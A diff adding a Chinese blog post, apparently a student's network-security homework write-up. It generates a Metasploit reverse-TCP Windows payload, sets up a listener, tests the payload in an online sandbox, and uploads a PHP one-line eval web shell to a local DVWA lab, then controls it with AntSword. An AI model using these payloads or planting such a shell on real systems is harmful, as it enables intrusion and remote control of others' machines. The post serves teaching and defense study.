@@ -328,6 +328,127 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-09 00:00:00+00:00">2026年11月9日</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="./" class="md-meta__link">作业</a>, 
+              <a href="../%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" class="md-meta__link">信息安全</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="webshell"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/">信息安全作业：远控木马免杀检测与 WebShell 控制实战</a></h2>
+<blockquote>
+<p>⚠️ <strong>安全声明</strong>：本实验为《网络攻防》课程作业记录。所有操作均在<strong>本地虚拟机（Host-Only/NAT 隔离网络）</strong>中完成，靶机为自行搭建的 Windows 虚拟机与 DVWA Web 靶场。<strong>不对任何未授权的真实服务器、网站进行探测</strong>；测试数据全部使用虚构数据，严禁将文中技术用于非法途径，仅供学习与防御研究。</p>
+</blockquote>
+<h3 id="_1"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#_1">第一部分：实验环境与工具基础</a></h3>
+<h4 id="1"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#1">1. 环境准备</a></h4>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">角色</th>
+<th style="text-align: left;">操作系统</th>
+<th style="text-align: left;">使用工具/环境</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>攻击机（控制端）</strong></td>
+<td style="text-align: left;">Kali Linux</td>
+<td style="text-align: left;">Metasploit、msfvenom、蚁剑</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>靶机（被控端）</strong></td>
+<td style="text-align: left;">Windows 10 虚拟机</td>
+<td style="text-align: left;">实验期间临时关闭 Defender 防护</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Web 靶场</strong></td>
+<td style="text-align: left;">本地 DVWA 靶场</td>
+<td style="text-align: left;">PHPStudy (PHP + MySQL)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>在线检测平台</strong></td>
+<td style="text-align: left;">-</td>
+<td style="text-align: left;">微步云沙箱 (s.threatbook.com)</td>
+</tr>
+</tbody>
+</table>
+<h4 id="2"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#2">2. 工具基础认识</a></h4>
+<ul>
+<li><strong>Metasploit Framework (MSF)</strong>：开源安全漏洞检测工具。本实验利用 <code>msfvenom</code> 模块生成远控木马（Payload），并使用 <code>multi/handler</code> 模块进行监听。</li>
+<li><strong>微步云沙箱</strong>：在线恶意软件分析平台，支持静态与动态行为检测，用于验证生成的木马是否会被安全设备查杀。</li>
+<li><strong>蚁剑 (AntSword)</strong>：开源跨平台网站管理工具，常被渗透测试人员用于连接和控制 WebShell（一句话木马）。</li>
+</ul>
+<hr>
+<h3 id="_2"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#_2">第二部分：远控木马生成与微步云沙箱检测</a></h3>
+<h4 id="1-payload"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#1-payload">1. 生成被控端 Payload</a></h4>
+<p>在 Kali Linux 终端中，使用 <code>msfvenom</code> 生成一个反向连接 TCP 的 Windows 可执行文件。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># 替换 &lt;Kali_IP&gt; 为你的 Kali 虚拟机实际 IP</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;Kali_IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">5000</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>payload.exe
+</code></pre></div>
+<h4 id="2_1"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#2_1">2. 提交微步云沙箱检测</a></h4>
+<ol>
+<li>浏览器访问 微步云沙箱，将生成的 payload.exe 上传。</li>
+<li>等待分析完成，查看检测报告。由于未做免杀处理，原生 Payload 会被判定为高危恶意软件（如检测出 Metasploit 家族特征）。
+https://./img/threatbook.png <!-- 替换为你本地的截图路径 --></li>
+</ol>
+<h4 id="3-msf"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#3-msf">3. MSF 监听与上线控制</a></h4>
+<p>在 Kali 中启动 MSF 控制台，配置监听模块，等待靶机运行木马后反弹连接：
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>msf6 &gt; use exploit/multi/handler
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>msf6 &gt; set payload windows/meterpreter/reverse_tcp
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>msf6 &gt; set LHOST &lt;Kali_IP&gt;
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>msf6 &gt; set LPORT 5000
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>msf6 &gt; exploit
+</code></pre></div>
+在靶机上双击运行 payload.exe，Kali 端成功获取 Meterpreter 会话。输入 sysinfo 验证权限。
+<img alt="搜索结果" class="glightbox" src="../../../assets/sha.png"><p></p>
+<h3 id="_3"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#_3">第三部分：一句话木马写入与蚁剑控制</a></h3>
+<h4 id="1_1"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#1_1">1. 准备一句话木马</a></h4>
+<p>本地新建一个 shell.php 文件，内容如下（pass 为连接密码）：
+</p><div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>php
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>&lt;?php @eval($_POST['pass']); ?&gt;
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>https://./img/shell_php.png &lt;!-- 替换为你本地的截图路径 --&gt;
+</code></pre></div><p></p>
+<h4 id="2_2"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#2_2">2. 将木马写入目标网站</a></h4>
+<p>利用本地搭建的 DVWA 靶场（File Upload 模块，安全级别设为 Low），将 shell.php 上传至目标网站，获取文件访问路径，例如：http://&lt;靶机_IP&gt;/hackable/uploads/shell.php。</p>
+<p>https://./img/upload_success.png <!-- 替换为你本地的截图路径 --></p>
+<h4 id="3"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#3">3. 蚁剑连接与控制</a></h4>
+<p>打开蚁剑客户端，右键空白处添加数据：
+- URL 地址：填入刚获取的木马路径。
+- 连接密码：填写 pass（与木马代码中的参数一致）。
+点击“测试连接”，提示成功后双击进入，即可看到目标服务器的文件目录，并在虚拟终端中执行 whoami 等无害命令。</p>
+<p>https://./img/antsword.png <!-- 替换为你本地的截图路径 --></p>
+<h4 id="_4"><a class="toclink" href="../../2026/11/09/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%A3%80%E6%B5%8B%E4%B8%8E-webshell-%E6%8E%A7%E5%88%B6%E5%AE%9E%E6%88%98/#_4">第四部分：实验总结</a></h4>
+<ul>
+<li>关于免杀对抗：原生的 msfvenom 木马特征明显，极易被微步云沙箱等安全设备通过静态特征匹配或动态行为分析捕获。实际攻防中，攻击者常使用加壳、混淆等技术尝试免杀，而防守方则需部署 EDR 等高级威胁检测系统。</li>
+<li>关于 Web 安全防护：一句话木马虽然代码简单，但配合蚁剑等工具能造成极大的破坏。开发人员在编写文件上传功能时，必须严格校验文件后缀、MIME 类型以及文件内容（白名单机制），防止恶意文件落地。</li>
+<li>工具双刃剑：Metasploit 和蚁剑是强大的安全工具，既能用于渗透测试，也会被黑客滥用。理解其运行原理（如反向连接、HTTP 流量特征）是进行有效防御的前提。</li>
+</ul>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-10-27 00:00:00+00:00">2026年10月27日</time></li>
         
           <li class="md-meta__item">
